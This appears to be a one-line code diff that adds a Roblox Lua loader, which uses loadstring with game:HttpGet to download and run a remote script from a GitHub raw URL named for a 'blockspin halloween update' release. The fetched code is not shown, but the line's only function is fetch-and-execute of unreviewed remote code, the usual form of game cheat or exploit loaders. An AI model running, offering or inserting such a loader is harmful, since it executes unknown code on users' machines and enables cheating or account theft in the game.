@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/blockspin-halloween-update-spam7-d45uasmfoc5vue.lua"))()
